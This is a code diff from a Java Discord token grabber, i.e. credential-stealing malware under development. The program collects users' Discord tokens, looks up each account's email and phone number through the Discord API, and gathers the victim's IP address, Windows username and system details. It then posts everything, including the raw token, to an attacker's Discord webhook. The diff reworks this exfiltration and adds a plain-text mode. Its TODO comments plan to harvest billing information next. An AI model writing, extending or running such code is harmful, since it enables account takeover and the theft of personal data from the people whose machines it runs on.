@@ -8,7 +8,6 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLDecoder;
-import java.nio.charset.Charset;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.*;
@@ -19,7 +18,6 @@ public class Main {
     private static boolean debug;
     private static boolean shouldPersist;
     public static void main(String[] args) throws Exception {
-        // TODO: Send normal text (not embed)
         // TODO: Billing information
         // TODO: Check for nitro
 
@@ -39,12 +37,8 @@ public class Main {
 
 
         //Gatherer
-        if (send_embed) {
-            for (String token : getTokens(ensure_valid)) {
-                sendEmbed(grabTokenInformation(discord_avatar_url, discord_username, token, send_embed), discord_webhook_url);
-            }
-        } else {
-            //sendText(grabTokenInformation(token));
+        for (String token : getTokens(ensure_valid)) {
+            sendEmbed(grabTokenInformation(discord_avatar_url, discord_username, token, send_embed), discord_webhook_url);
         }
     }
 
@@ -74,9 +68,9 @@ public class Main {
         //Get discord token
         JSONObject tokenInformation = new JSONObject(get_request("https://discordapp.com/api/v6/users/@me", true, token));
         accountInfo_username = tokenInformation.getString("username") + "#" + tokenInformation.getString("discriminator");
-        accountInfo_email = tokenInformation.getString("email");
+        accountInfo_email = String.valueOf(tokenInformation.get("email"));
         accountInfo_phoneNr = String.valueOf(tokenInformation.get("phone"));
-        accountInfo_imageURL = "https://cdn.discordapp.com/avatars/"+tokenInformation.getString("id")+"/"+tokenInformation.getString("avatar")+".png";
+        accountInfo_imageURL = "https://cdn.discordapp.com/avatars/"+tokenInformation.getString("id")+"/"+tokenInformation.get("avatar")+".png";
         colour = 9109759;
 
 
@@ -92,8 +86,11 @@ public class Main {
         JSONObject secondField = new JSONObject();
         JSONObject tokenField = new JSONObject();
 
-        webhook_content.put("username", username);
-        webhook_content.put("avatar_url", avatar_url);
+        if(sendEmbed) {
+            webhook_content.put("avatar_url", avatar_url);
+            webhook_content.put("username", username);
+        }
+
         embedObject.put("color", colour);
         footerObject.put("icon_url", "https://i.ibb.co/fps45hd/steampfp.jpg");
         footerObject.put("text", "November | " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(System.currentTimeMillis()));
@@ -101,10 +98,22 @@ public class Main {
         embedObject.put("thumbnail", new JSONObject().put("url", accountInfo_imageURL));
         embedObject.put("author", new JSONObject().put("name", accountInfo_username));
         firstField.put("name", "Account Info");
-        firstField.put("value", "Email: "+accountInfo_email+"\nPhone: "+accountInfo_phoneNr+"\nNitro: Coming Soon\nBilling Info: Coming Soon");
+        firstField.put("value",
+                "Email: "+accountInfo_email+
+                "\nPhone: "+accountInfo_phoneNr+
+                "\nNitro: Coming Soon"+
+                "\nBilling Info: Coming Soon"
+        );
+
         firstField.put("inline", true);
         secondField.put("name", "PC Info");
-        secondField.put("value", "IP: "+pcInfo_IP+"\nUsername: "+pcInfo_Username+"\nWindows version: "+pcInfo_WindowsVersion+"\nCPU Arch: "+pcInfo_cpuArch);
+        secondField.put("value",
+                "IP: " +pcInfo_IP+
+                "\nUsername: "+pcInfo_Username+
+                "\nWindows version: "+pcInfo_WindowsVersion+
+                "\nCPU Arch: "+pcInfo_cpuArch
+        );
+
         secondField.put("inline", true);
         tokenField.put("name", "**Token**");
         tokenField.put("value", "```"+token+"```");
@@ -117,7 +126,15 @@ public class Main {
 
         embed_content.put(embedObject);
 
-        webhook_content.put("embeds", embed_content);
+        if (sendEmbed) {
+            webhook_content.put("embeds", embed_content);
+        } else {
+            webhook_content.put("avatar_url", "https://cdn.discordapp.com/avatars/"+tokenInformation.getString("id")+"/"+tokenInformation.get("avatar")+".png");
+            webhook_content.put("username", tokenInformation.getString("username") + "#" + tokenInformation.getString("discriminator"));
+            webhook_content.put("content", "***Discord Info***\n**Email:**\n```"+accountInfo_email+"```\n**Phone NR:**\n```"+accountInfo_phoneNr+"```\n**Nitro:**\n```Coming soon...```\n**Billing Info:**\n```Coming soon...```\n**Token**\n```"+token+"```\n\n***PC Info**\n**Username: ***\n```"+pcInfo_Username+"```\n**IP:**\n```"+pcInfo_IP+"```\n**Windows version:**\n```"+pcInfo_WindowsVersion+"```\n**CPU Arch:**\n```"+pcInfo_cpuArch+"```");
+
+        }
+
         if (debug) {
             System.out.println(webhook_content.toString());
         }
